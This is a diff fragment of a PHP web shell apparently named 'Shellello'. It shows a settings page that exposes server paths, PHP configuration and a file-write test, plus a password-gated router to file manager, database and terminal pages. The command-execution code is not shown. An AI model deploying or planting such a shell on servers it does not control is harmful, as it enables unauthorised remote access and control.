+.extensions-grid { display: flex; flex-wrap: wrap; gap: 0.5rem; }
+.extension-badge {
+    padding: 0.25rem 0.75rem;
+    background: #e0e7ff;
+    color: #4338ca;
+    border-radius: 20px;
+    font-size: 0.8rem;
+    font-weight: 500;
+}
+.tools-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 1rem;
+}
+.tool-card {
+    padding: 1.25rem;
+    background: #f8fafc;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+    border: 2px solid transparent;
+    text-align: center;
+}
+.tool-card:hover {
+    background: #eff6ff;
+    border-color: #3b82f6;
+    transform: translateY(-2px);
+}
+.tool-icon { font-size: 2rem; display: block; margin-bottom: 0.75rem; }
+.tool-card h4 { margin: 0 0 0.5rem 0; font-size: 1rem; color: #1f2937; }
+.tool-card p { margin: 0; font-size: 0.85rem; color: #6b7280; }
+.modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+}
+.modal-overlay.show { display: flex; }
+.modal {
+    background: white;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 500px;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+}
+.modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem 1.5rem;
+    border-bottom: 1px solid #e5e7eb;
+}
+.modal-header h3 { margin: 0; font-size: 1.1rem; }
+.modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #6b7280; }
+.modal-body { padding: 1.5rem; }
+.modal-body label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
+.modal-body .form-control { width: 100%; }
+.modal-footer {
+    display: flex;
+    justify-content: flex-end;
+    gap: 0.75rem;
+    padding: 1rem 1.5rem;
+    border-top: 1px solid #e5e7eb;
+    background: #f9fafb;
+    border-radius: 0 0 12px 12px;
+}
+.hash-result { margin-top: 1rem; padding-top: 1rem; border-top: 1px solid #e5e7eb; }
+.hash-display {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    background: #1e293b;
+    padding: 0.75rem 1rem;
+    border-radius: 8px;
+    margin-top: 0.5rem;
+}
+.hash-display code { flex: 1; color: #22c55e; font-size: 0.85rem; word-break: break-all; }
+.card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
+.card-header h3 { margin: 0; font-size: 1.1rem; }
+.card-icon { font-size: 1.5rem; }
+</style>
+
+<div class="settings-container">
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">🐘</span>
+            <h3>PHP Configuration</h3>
+        </div>
+        <div class="card-body">
+            <div class="config-grid">
+                <?php foreach ($phpInfo as $key => $value): ?>
+                <div class="config-item">
+                    <span class="config-label"><?php echo htmlspecialchars($key); ?></span>
+                    <span class="config-value"><?php echo htmlspecialchars($value); ?></span>
+                </div>
+                <?php endforeach; ?>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">🧩</span>
+            <h3>Loaded Extensions (<?php echo count($extensions); ?>)</h3>
+        </div>
+        <div class="card-body">
+            <div class="extensions-grid">
+                <?php foreach ($extensions as $ext): ?>
+                <span class="extension-badge"><?php echo htmlspecialchars($ext); ?></span>
+                <?php endforeach; ?>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">🖥️</span>
+            <h3>Server Variables</h3>
+        </div>
+        <div class="card-body">
+            <div class="config-grid">
+                <div class="config-item">
+                    <span class="config-label">Server Software</span>
+                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'N/A'); ?></span>
+                </div>
+                <div class="config-item">
+                    <span class="config-label">Document Root</span>
+                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'N/A'); ?></span>
+                </div>
+                <div class="config-item">
+                    <span class="config-label">Script Path</span>
+                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['SCRIPT_FILENAME'] ?? 'N/A'); ?></span>
+                </div>
+                <div class="config-item">
+                    <span class="config-label">Remote Address</span>
+                    <span class="config-value"><?php echo htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? 'N/A'); ?></span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">🔧</span>
+            <h3>Tools</h3>
+        </div>
+        <div class="card-body">
+            <div class="tools-grid">
+                <div class="tool-card" onclick="showModal('hashModal')">
+                    <span class="tool-icon">🔐</span>
+                    <h4>Generate Password Hash</h4>
+                    <p>Create SHA-256 hash</p>
+                </div>
+                <div class="tool-card" onclick="window.open('?action=phpinfo','_blank')">
+                    <span class="tool-icon">ℹ️</span>
+                    <h4>PHP Info</h4>
+                    <p>Full PHP configuration</p>
+                </div>
+                <div class="tool-card" onclick="testWrite()">
+                    <span class="tool-icon">✍️</span>
+                    <h4>Test Write Access</h4>
+                    <p>Check permissions</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="hashModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>🔐 Generate Password Hash</h3>
+                <button class="modal-close" onclick="closeModal('hashModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <label>Enter Password:</label>
+                <input type="password" id="hashPassword" class="form-control" placeholder="Your password">
+                <div id="hashResult" class="hash-result" style="display:none;">
+                    <label>SHA-256 Hash:</label>
+                    <div class="hash-display">
+                        <code id="hashValue"></code>
+                        <button class="btn btn-sm btn-secondary" onclick="copyHash()">📋</button>
+                    </div>
+                    <p class="text-muted" style="margin-top:0.5rem;font-size:0.85rem;">Set this as AUTH_HASH in the config.</p>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('hashModal')">Close</button>
+                <button class="btn btn-primary" onclick="genHash()">Generate</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function showModal(id) { document.getElementById(id).classList.add('show'); }
+function closeModal(id) { document.getElementById(id).classList.remove('show'); }
+
+async function genHash() {
+    var pw = document.getElementById('hashPassword').value;
+    if (!pw) { toast('Enter a password', 'error'); return; }
+    
+    var enc = new TextEncoder();
+    var data = enc.encode(pw);
+    var buf = await crypto.subtle.digest('SHA-256', data);
+    var arr = Array.from(new Uint8Array(buf));
+    var hex = arr.map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
+    
+    document.getElementById('hashValue').textContent = hex;
+    document.getElementById('hashResult').style.display = 'block';
+}
+
+function copyHash() {
+    var hash = document.getElementById('hashValue').textContent;
+    navigator.clipboard.writeText(hash).then(function() {
+        toast('Copied!', 'success');
+    });
+}
+
+function testWrite() {
+    var fd = new FormData();
+    fd.append('path', '<?php echo getcwd(); ?>');
+    fd.append('name', '.write_test_' + Date.now());
+    
+    fetch('?action=create_file', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                toast('Write access OK!', 'success');
+            } else {
+                toast('Write access DENIED', 'error');
+            }
+        });
+}
+
+function toast(msg, type) {
+    var t = document.getElementById('toast');
+    if (!t) {
+        t = document.createElement('div');
+        t.id = 'toast';
+        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:opacity 0.3s;';
+        document.body.appendChild(t);
+    }
+    t.textContent = msg;
+    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
+    t.style.opacity = '1';
+    setTimeout(function() { t.style.opacity = '0'; }, 3000);
+}
+</script>
+<?php
+    $content = ob_get_clean();
+    renderLayout('Settings', $content, 'settings');
+}
+
+// ========== 12_ROUTER ==========
+/**
+ * Shellello - Module 12: Main Router
+ */
+
+function main() {
+    // Handle logout
+    if (isset($_GET['logout'])) {
+        logout();
+    }
+
+    // Handle API actions (AJAX requests)
+    if (isset($_GET['action'])) {
+        if (!isAuthenticated()) {
+            header('Content-Type: application/json');
+            echo json_encode(['status' => 'error', 'message' => 'Not authenticated']);
+            exit;
+        }
+        handleApiAction($_GET['action']);
+        return;
+    }
+
+    // Handle authentication
+    if (!isAuthenticated()) {
+        $error = null;
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+            if (attemptLogin($_POST['password'])) {
+                header("Location: ?page=dashboard");
+                exit;
+            } else {
+                $error = 'Invalid password. Please try again.';
+            }
+        }
+        renderLogin($error);
+        return;
+    }
+
+    // Route to pages
+    $page = $_GET['page'] ?? 'dashboard';
+    
+    switch ($page) {
+        case 'files':
+            renderFileManager();
+            break;
+        case 'database':
+            renderDatabase();
+            break;
+        case 'terminal':
+            renderTerminal();
+            break;
+        case 'settings':
+            renderSettings();
+            break;
+        case 'dashboard':
+        default:
+            renderDashboard();
+            break;
+    }
+}
+
+// Run the application
+main();
